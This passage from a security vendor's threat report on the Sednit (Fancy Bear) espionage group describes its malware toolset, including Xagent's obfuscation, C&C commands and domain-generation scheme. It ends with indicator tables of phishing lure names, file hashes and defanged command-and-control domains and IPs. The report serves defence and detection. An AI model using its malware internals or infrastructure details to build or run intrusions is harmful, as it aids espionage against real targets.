<!-- [Format Time: 0.0000 seconds] -->
<p>If the intended potential victim opens the document and makes the foolhardy chose to ignore the warnings, the above script is executed and the Seduploader binary is downloaded from the C&amp;C server and executed on the target’s system.</p>
<p>This is only a brief overview of how the Sednit operators have been trying to compromise new victims since the publication of our white paper. As you can see, they are just as active as they were and are still actively targeting governments worldwide.</p>
<h2>Tooling</h2>
<p>The previous section shows how the Sednit group spent the last year from the infection-vector point of view. This section describes changes that this group made to their toolset. In 2016, ESET released a deep analysis of each component; it is available <a href="https://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-full.pdf" target="_blank" rel="noopener">here</a>.</p>
<p>Over the years the group developed a lot of components to infect, gather and steal information from their targets. Some of these components have disappeared since, while others have been improved.</p>
<h2>Seduploader</h2>
<p>Seduploader serves as reconnaissance malware. It is made up of two distinct components: a dropper, and the persistent payload installed by this dropper. Seduploader is still used by the Sednit group but it has received a few improvements. During the April 2017 campaign a new version of Seduploader came out with some new features, such as a screenshot function or the ability to directly execute loaded into memory from the C&amp;C server. Recently, we have seen the Seduploader dropper replaced by PowerShell commands delivering the Seduploader payload.</p>
<h2>Xtunnel</h2>
<p>Xtunnel is a network proxy tool that can relay any kind of network trace between a C&amp;C server on the Internet and an endpoint computer inside a local network. Xtunnel is still used by the Sednit group.</p>
<h2>Sedkit</h2>
<p>Sedkit is the Sednit exploit-kit; it’s used only for targeted attacks, starting with targeted phishing emails with URLs that spoof legitimate URLs. October 2016 is the last time we’re aware that Sedkit was used.</p>
<h2>Sedreco</h2>
<p>Sedreco serves as a spying backdoor; its functionalities can be extended with dynamically loaded plugins. It is made up of two distinct components: a dropper and the persistent payload installed by this dropper. We have not seen this component since April 2016.</p>
<h2>USBStealer</h2>
<p>USBStealer serves as a network tool that extracts sensitive information from air-gapped networks. We have not seen this component since mid 2015.</p>
<h2>Xagent</h2>
<p>Xagent is a modular backdoor with spying functionalities such as keystroke logging and file exfiltration. Xagent is the group&#8217;s flagship backdoor and heavily used in their operations. Early versions for Linux and Windows were seen years ago, then in 2015 an <a href="http://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-update-ios-espionage-app-found" target="_blank" rel="noopener">iOS</a> version came out. One year later, an <a href="https://www.crowdstrike.com/blog/danger-close-fancy-bear-tracking-ukrainian-field-artillery-units" target="_blank" rel="noopener">Android</a> version was discovered and finally, in the beginning of 2017, an Xagent sample for <a href="https://labs.bitdefender.com/2017/02/new-xagent-mac-malware-linked-with-the-apt28/" target="_blank" rel="noopener">OS X was described.</a></p>
<p>We saw a new version of the Windows version of Xagent last February. Because of the following strings found in the binaries, we deduced that it was version 4 of the backdoor. The different versions of Xagent’s modules are listed in Table 1.</p>
<p><em><strong>Table 1. Xagent versioning</strong><br />
</em>
<table id="tablepress-482" class="tablepress tablepress-id-482">
<thead>
<tr class="row-1 odd">
	<th class="column-1"><h3>module/channel</h3></th><th class="column-2"><h3>v3 uid</h3></th><th class="column-3"><h3>v4 uid</h3></th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">AgentKernel</td><td class="column-2">3303</td><td class="column-3">4401</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">WinHttp</td><td class="column-2">2111</td><td class="column-3">4402</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">ModuleFileSystem</td><td class="column-2">2103</td><td class="column-3">4411</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">ModuleRemoteKeyLogger</td><td class="column-2">2107</td><td class="column-3">4412</td>
</tr>
<tr class="row-6 even">
	<td class="column-1">ProcessRetranslatorModule</td><td class="column-2">2106</td><td class="column-3">4413</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1">Unknown [1]</td><td class="column-2">??</td><td class="column-3">4414</td>
</tr>
</tbody>
</table>
</p>
<p>Version 4 of Xagent came with new techniques for strings obfuscation and all Run-time type information (RTTI) are obfuscated as well. These techniques significantly improve the way in which strings are encrypted with a method unique to each binary. Previous versions of Xagent used an XOR loop to decrypt strings. The new encryption algorithm is a series of operations with values probably generated at the compile time. The following figure illustrates the complexity of the code.</p>
<p><a href="/wp-content/uploads/2017/12/dec_str_v4.png"><img class="aligncenter wp-image-105633" src="/wp-content/uploads/2017/12/dec_str_v4-265x300.png" alt="Fancy Bear" width="640" height="725" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/12/dec_str_v4-265x300.png 265w, https://www.welivesecurity.com/wp-content/uploads/2017/12/dec_str_v4-768x870.png 768w, https://www.welivesecurity.com/wp-content/uploads/2017/12/dec_str_v4-904x1024.png 904w, https://www.welivesecurity.com/wp-content/uploads/2017/12/dec_str_v4.png 1052w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>However, the HexRays decompiler does a decent job of simplifying it. Here is an example:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581ba32690e057718487" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">C</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
return (((((a2 ^ (((((((((((a1 - 13 + 42) ^ 0x7B) + 104) ^ 0x72) - 81 - a2 - 76) ^ 0x31) + 75) ^ 0x3B) + 3) ^ 0x40) + 100) ^ 0x1C ^ 0xA9) + 41) ^ 0xB9) - 65) ^ 0xA) % 256;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581ba32690e057718487-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581ba32690e057718487-1"><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-v">a2</span><span class="crayon-h"> </span><span class="crayon-o">^</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-v">a1</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-cn">13</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">42</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">^</span><span class="crayon-h"> </span><span class="crayon-cn">0x7B</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">104</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">^</span><span class="crayon-h"> </span><span class="crayon-cn">0x72</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-cn">81</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">a2</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-cn">76</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">^</span><span class="crayon-h"> </span><span class="crayon-cn">0x31</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">75</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">^</span><span class="crayon-h"> </span><span class="crayon-cn">0x3B</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">^</span><span class="crayon-h"> </span><span class="crayon-cn">0x40</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">100</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">^</span><span class="crayon-h"> </span><span class="crayon-cn">0x1C</span><span class="crayon-h"> </span><span class="crayon-o">^</span><span class="crayon-h"> </span><span class="crayon-cn">0xA9</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">41</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">^</span><span class="crayon-h"> </span><span class="crayon-cn">0xB9</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-cn">65</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">^</span><span class="crayon-h"> </span><span class="crayon-cn">0xA</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-h"> </span><span class="crayon-cn">256</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0004 seconds] -->
<p>The AgentKernel can receive commands from the C&amp;C server to interact with modules and channels. Some of the previously-seen C&amp;C commands have been removed, and some new ones added.</p>
<p>Earlier versions supported command 2, PING_REQUEST. This has been removed in version 4 but the operator can still get the list of modules with the command GET_AGENT_INFO, which is more verbose than the previous command. Commands 34, 35 and 36 showed similarities with SET_PARAMETERS, which allows interaction with <em>LocalStorage</em>, which is the kernel store. It contains both file-based storage for communication with the C&amp;C server and Microsoft registry base storage to store various configuration parameters.</p>
<p>A new feature implemented in the <em>WinHttp</em> channel is a Domain Generation algorithm (DGA) for fallback domains. The <em>WinHttp</em> channel is the channel responsible for communicating with the C&amp;C server. Unlike the usual DGA that retrieves its seed from pseudo-random numbers, this one gets a given seed (probably generated at compilation) for a given sample. The way that domains are generated is as follows:</p>
<ul>
<li>a suite of operations are applied to the seed</li>
<li>the result gives an offset for three different arrays (adding another seed for each array)</li>
<li>once the new offset is calculated (offset + seed), it decrypts the word</li>
<li>all words are concatenated (four words are used to generate the domain; the fourth word came from the first array but with a different offset)</li>
<li>the &#8220;.com&#8221; suffix is added.</li>
</ul>
<p>The development of the backdoor with the addition of new features and compatibility with all major platforms out there make Xagent the core backdoor used by the group.</p>
<h2>DealersChoice</h2>
<p>DealersChoice is a platform that generates malicious documents containing embedded Adobe Flash files. Palo Alto Network researchers analyzed two variants — variant A, which is a standalone variant including Flash exploit code packaged with a payload, and variant B, which is a modular variant that loads  exploit code on demand. This new component appeared in 2016 and is still in use.</p>
<h2>Downdelph</h2>
<p>Downdelph is a lightweight downloader developed in the Delphi programming language. As we already mentioned in our white paper, its period of activity was from November 2013 to September 2015 and there have been no new variants seen since.</p>
<h2>Summary</h2>
<p>The Sednit group is without a doubt still an active group. The main entry point for their flagship backdoor is phishing emails, and they seem to have a great deal of success with that technique. Xagent is the core of their operation, which we can now find on any and all major  platforms, mobile or not. The newest version of Xagent is very interesting and the operators seem to have put a lot of work into it. We have seen since the discovery two instances of Xagent in the wild — one with the channel and the unknown module — one with all modules and channel but without the unknown module. We can hypothesize that the Sednit group added another layer of checking on its targets by dropping an Xagent with just a few modules and if the victim is interesting enough, it will drop another version with all modules.</p>
<h2>IoCs</h2>
<p><em>Table 2. Phishing<br />
</em>
<table id="tablepress-483" class="tablepress tablepress-id-483">
<thead>
<tr class="row-1 odd">
	<th class="column-1"><strong>Phishing document</strong></th><th class="column-2"><strong>SHA-1</strong></th><th class="column-3"><strong>ESET detection</strong></th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">Bulletin.doc</td><td class="column-2"><code>68064fc152e23d56e541714af52651cb4ba81aaf</code></td><td class="column-3">Win32/Sednit.AX</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1"></td><td class="column-2"><code>f3805382ae2e23ff1147301d131a06e00e4ff75f</code></td><td class="column-3">Win32/Exploit.CVE-2016-4117.A</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">OC_PSO_2017.doc</td><td class="column-2"><code>512bdfe937314ac3f195c462c395feeb36932971</code></td><td class="column-3">Win32/Exploit.Agent.NUB</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">NASAMS.doc</td><td class="column-2"><code>30b3e8c0f3f3cf200daa21c267ffab3cad64e68b</code></td><td class="column-3">Win32/Exploit.Agent.NTR</td>
</tr>
<tr class="row-6 even">
	<td class="column-1">Programm_Details.doc</td><td class="column-2"><code>4173b29a251cd9c1cab135f67cb60acab4ace0c5</code></td><td class="column-3">Win32/Exploit.Agent.NTO</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1">Operation_in_Mosul.rtf</td><td class="column-2"><code>12a37cfdd3f3671074dd5b0f354269cec028fb52</code></td><td class="column-3">Win32/Exploit.Agent.NTR</td>
</tr>
<tr class="row-8 even">
	<td class="column-1">ARM-NATO_ENGLISH_30_NOV_2016.doc</td><td class="column-2"><code>15201766bd964b7c405aeb11db81457220c31e46</code></td><td class="column-3">SWF/Agent.L</td>
</tr>
<tr class="row-9 odd">
	<td class="column-1">Olympic-Agenda-2020-20-20-Recommendations.doc</td><td class="column-2"><code>8078e411fbe33864dfd8f87ad5105cc1fd26d62e</code></td><td class="column-3">Win32/Exploit.Agent.BL</td>
</tr>
<tr class="row-10 even">
	<td class="column-1">Merry_Christmas!.docx</td><td class="column-2"><code>33447383379ca99083442b852589111296f0c603</code></td><td class="column-3">Win32/Exploit.Agent.NUG</td>
</tr>
<tr class="row-11 odd">
	<td class="column-1">Trump’s_Attack_on_Syria_English.docx</td><td class="column-2"><code>d5235d136cfcadbef431eea7253d80bde414db9d</code></td><td class="column-3">Win32/Exploit.Agent.NWZ</td>
</tr>
<tr class="row-12 even">
	<td class="column-1">Hotel_Reservation_Form.doc</td><td class="column-2"><code>f293a2bfb728060c54efeeb03c5323893b5c80df</code></td><td class="column-3">Win32/Sednit.BN</td>
</tr>
<tr class="row-13 odd">
	<td class="column-1">SB_Doc_2017-3_Implementation_of_Key_Taskings_and_Next_Steps.doc</td><td class="column-2"><code>bb10ed5d59672fbc6178e35d0feac0562513e9f0</code></td><td class="column-3">Win32/Sednit.BN</td>
</tr>
<tr class="row-14 even">
	<td class="column-1"></td><td class="column-2"><code>4873bafe44cff06845faa0ce7c270c4ce3c9f7b9</code><br /><code>169c8f3e3d22e192c108bc95164d362ce5437465</code><br /><code>cc7607015cd7a1a4452acd3d87adabdd7e005bd7</code></td><td class="column-3">Win32/Sednit.BN</td>
</tr>
<tr class="row-15 odd">
	<td class="column-1">Caucasian_Eagle_ENG.docx</td><td class="column-2"><code>5d2c7d87995cc5b8184baba2c7a1900a48b2f42d</code></td><td class="column-3">Win32/Exploit.Agent.NTM</td>
</tr>
<tr class="row-16 even">
	<td class="column-1">World War3.docx</td><td class="column-2"><code>7aada8bcc0d1ab8ffb1f0fae4757789c6f5546a3</code></td><td class="column-3">SWF/Exploit.CVE-2017-11292.A</td>
</tr>
<tr class="row-17 odd">
	<td class="column-1">SaberGuardian2017.docx</td><td class="column-2"><code>68c2809560c7623d2307d8797691abf3eafe319a</code></td><td class="column-3">VBA/DDE.E</td>
</tr>
<tr class="row-18 even">
	<td class="column-1">IsisAttackInNewYork.docx</td><td class="column-2"><code>1c6c700ceebfbe799e115582665105caa03c5c9e</code></td><td class="column-3">VBA/DDE.L</td>
</tr>
</tbody>
</table>
</p>
<p><em>Table 3. Seduploader Samples<br />
</em>
<table id="tablepress-484" class="tablepress tablepress-id-484">
<thead>
<tr class="row-1 odd">
	<th class="column-1"><strong>SHA-1</strong></th><th class="column-2"><strong>ESET detection</strong></th><th class="column-3"><strong>C&amp;C server</strong></th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1"><code>9f6bed7d7f4728490117cbc85819c2e6c494251b</code></td><td class="column-2">Win32/Sednit.AX</td><td class="column-3">servicecdp[.]com:87.236.211[.]182</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1"><code>6e167da3c5d887fa2e58da848a2245d11b6c5ad6</code></td><td class="column-2">Win32/Sednit.BG</td><td class="column-3">runvercheck[.]com:185.156.173[.]70 remsupport[.]org:191.101.31[.]96</td>
</tr>
<tr class="row-4 even">
	<td class="column-1"><code>e338d49c270baf64363879e5eecb8fa6bdde8ad9</code></td><td class="column-2">Win32/Sednit.BG</td><td class="column-3">wmdmediacodecs[.]com:95.215.45[.]43</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1"><code>f9fd3f1d8da4ffd6a494228b934549d09e3c59d1</code></td><td class="column-2">Win32/Sednit.BN</td><td class="column-3">mvband[.]net:89.45.67[.]144 mvtband[.]net:89.33.246[.]117</td>
</tr>
<tr class="row-6 even">
	<td class="column-1"><code>476fc1d31722ac26b46154cbf0c631d60268b28a</code></td><td class="column-2">Win32/Sednit.BN</td><td class="column-3">viters[.]org:89.187.150[.]44</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1"><code>8a68f26d01372114f660e32ac4c9117e5d0577f1</code></td><td class="column-2">Win32/Sednit.BN</td><td class="column-3">myinvestgroup[.]com:146.185.253[.]132</td>
</tr>
<tr class="row-8 even">
	<td class="column-1"><code>9c47ca3883196b3a84d67676a804ff50e22b0a9f</code></td><td class="column-2">Win32/Sednit.BR</td><td class="column-3">space-delivery[.]com:86.106.131[.]141</td>
</tr>
<tr class="row-9 odd">
	<td class="column-1"><code>ab354807e687993fbeb1b325eb6e4ab38d428a1e</code></td><td class="column-2">Win32/Sednit.BS</td><td class="column-3">satellitedeluxpanorama[.]com:89.34.111[.]160</td>
</tr>
<tr class="row-10 even">
	<td class="column-1"><code>4bc722a9b0492a50bd86a1341f02c74c0d773db7</code></td><td class="column-2">Win32/Sednit.BS</td><td class="column-3">webviewres[.]net:185.216.35[.]26</td>
</tr>
</tbody>
</table>
</p>
<p><em>Table 4. Xagent Samples<br />
</em>
<table id="tablepress-485" class="tablepress tablepress-id-485">
<thead>
<tr class="row-1 odd">
	<th class="column-1"><strong>SHA-1</strong></th><th class="column-2"><strong>ESET detection</strong></th><th class="column-3"><strong>C&amp;C server</strong></th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1"><code>6f0fc0ebba3e4c8b26a69cdf519edf8d1aa2f4bb</code></td><td class="column-2">Win64/Sednit.Z</td><td class="column-3">movieultimate[.]com</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1"><code>e19f753e514f6adec8f81bcdefb9117979e69627</code></td><td class="column-2">Win64/Sednit.Z</td><td class="column-3">meteost[.]com</td>
</tr>
<tr class="row-4 even">
	<td class="column-1"><code>961468ddd3d0fa25beb8210c81ba620f9170ed30</code></td><td class="column-2">Win32/Sednit.BO</td><td class="column-3">faststoragefiles[.]org</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1"><code>a0719b50265505c8432616c0a4e14ed206981e95</code></td><td class="column-2">Win32/Sednit.BO</td><td class="column-3">nethostnet[.]com</td>
</tr>
<tr class="row-6 even">
	<td class="column-1"><code>2cf6436b99d11d9d1e0c488af518e35162ecbc9c</code></td><td class="column-2">Win64/Sednit.Y</td><td class="column-3">faststoragefiles[.]org</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1"><code>fec29b4f4dccc59770c65c128dfe4564d7c13d33</code></td><td class="column-2">Win64/Sednit.Y</td><td class="column-3">fsportal[.]net</td>
</tr>
<tr class="row-8 even">
	<td class="column-1"><code>57d7f3d31c491f8aef4665ca4dd905c3c8a98795</code></td><td class="column-2">Win64/Sednit.Z</td><td class="column-3">fastdataexchange[.]org</td>
</tr>
<tr class="row-9 odd">
	<td class="column-1"><code>a3bf5b5cf5a5ef438a198a6f61f7225c0a4a7138</code></td><td class="column-2">Win32/Sednit.BO</td><td class="column-3">newfilmts[.]com</td>
</tr>
<tr class="row-10 even">
	<td class="column-1"><code>1958e722afd0dba266576922abc98aa505cf5f9a</code></td><td class="column-2">Win32/Sednit.BO</td><td class="column-3">newfilmts[.]com</td>
</tr>
</tbody>
</table>
</p>
<p>[1] <em>We weren&#8217;t able to match this module with previous well-known modules</em></p>

                            
                                                            <div class="dot">
                                    <span class="icomoon icon-icon_article_dot"></span>
                                </div>

                                <div class="meta">
                                    <div class="wls-authors wls-authors-footer">
                                                <div class="wls-author">
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/esetresearch/" title="ESET Research">
                    ESET Research                </a>
            </div>
        </div>
                                            </div>
                                    <span class="strong">
								        <time datetime="2017-12-21 14:58:28">21 Dec 2017 - 02:58PM</time>
                                    </span>
                                </div>
                            
                            <div class="widgets row">
                                <div class="col-md-12 col-sm-12 col-xs-12">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                                        <h3><span class="text">Newsletter</span></h3>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
                                    			
		<div class="heading-line col-md-12 no-padding sidebar-item clearfix">
			<h3>
				<span class="text">Newsletter</span>
			</h3>

			<form action="//liondigital.us3.list-manage.com/subscribe/post?u=b76f82b1cc198ab1d80665c99&amp;id=102b0810e2" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
				<div class="search-input clearfix">
					<input type="text" name="email" value="" placeholder="Email...">
					<button>
						Submit					</button>
				</div>
			</form>		
		</div>
                                </div>
                            </div>

                                                            <div class="similar-articles row">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12">
                                        <h3><span class="text">Similar Articles</span></h3>
                                    </div>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/social-media-2/" class="category-tag-btn">Social Media</a>                                                <a href="https://www.welivesecurity.com/2021/03/19/7-steps-staying-safe-secure-twitter/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/twitter-anniversary-privacy-protection-tips-623x432.jpg"
                                                         alt="Sednit update: How Fancy Bear Spent the Year">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/19/7-steps-staying-safe-secure-twitter/">
                                                    7 steps to staying safe and secure on Twitter                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/privacy/" class="category-tag-btn">Privacy</a>                                                <a href="https://www.welivesecurity.com/2021/03/19/trust-your-surveillance-why-hacked-cameras-are-very-bad/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/surveillance-cameras-hacked-breach-privacy-623x432.jpg"
                                                         alt="Sednit update: How Fancy Bear Spent the Year">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/19/trust-your-surveillance-why-hacked-cameras-are-very-bad/">
                                                    Trust your surveillance? Why hacked cameras are very bad                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/cybercrime/" class="category-tag-btn">Cybercrime</a>                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/fbi-cybercrime-losses-2020-ic3-623x432.jpg"
                                                         alt="Sednit update: How Fancy Bear Spent the Year">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/">
                                                    FBI: Cybercrime losses topped US$4.2 billion in 2020                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/mobile-security/" class="category-tag-btn">Mobile Security</a>                                                <a href="https://www.welivesecurity.com/2021/03/18/beware-android-trojan-posing-clubhouse-app/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/clubhouse-trojan-app-android-623x432.jpg"
                                                         alt="Sednit update: How Fancy Bear Spent the Year">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/18/beware-android-trojan-posing-clubhouse-app/">
                                                    Beware Android trojan posing as Clubhouse app                                                </a>
                                            </h4>
                                        </article>
                                                                    </div>
                            
                            <div class="comments row">
                                <div class="heading-line col-xs-12">
                                    <h3><span class="text">Discussion</span></h3>
                                                                            
<div id="disqus_thread"></div>
                                                                    </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    	</div> 	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-2">
                    <div class="hidden-sm hidden-xs">
                        <div class="logo-wrapper footer clearfix">
                            <div class="dark clearfix">
                                <a href="https://www.welivesecurity.com/" class="wls">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-1.svg" alt="Welivesecurity.com">
                                </a>
                                <a href="https://www.eset.com" class="eset">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-2.svg" alt="by ESET">
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="hidden-lg hidden-md">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
				</div>
				<nav id="footer" class="clearfix">
											<div class="mobile-block">
																<div class="col-md-2 col-md-offset-2">
										<ul>
																							<li>
													<a href="/">Home</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/about-us/">About Us</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/contact-us/">Contact Us</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/sitemap/">Sitemap</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/our-experts/">Our Experts</a>
												</li>
																							<li>
													<a href="https://eset.com">ESET</a>
												</li>
																					</ul>
									</div>
													</div>
											<div class="mobile-block">
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/research/">Research</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/category/how-to/">How To</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/categories/">Categories</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/rss-configurator/">RSS Configurator</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/news-widget-generator/">News Widget</a>
												</li>
																					</ul>
									</div>
													</div>
									</nav>
			</div>
			<div class="row">
				<div class="col-md-12 legal clearfix">
					<div class="wrap clearfix">
													<span>
								<a href="https://www.welivesecurity.com/privacy/">
									Privacy policy								</a>
							</span>
													<span>
								<a href="https://www.welivesecurity.com/legal-information/">
									Legal Information								</a>
							</span>
											</div>
					<span class="copyright pull-right">Copyright &copy; ESET, All Rights Reserved</span>
				</div>
							</div>
		</div>
	</footer>
	
	<button id="back-to-top" class="animated-scroll" data-target="absoluteTop">
		<span class="icomoon icon-icon_arrow"></span>
		<span class="text">Back to top</span>
	</button>

			<div class="social-wrapper-mobile hidden-lg hidden-md hidden-sm" id="mobile-article-sharer">
			<div class="col-xs-12">
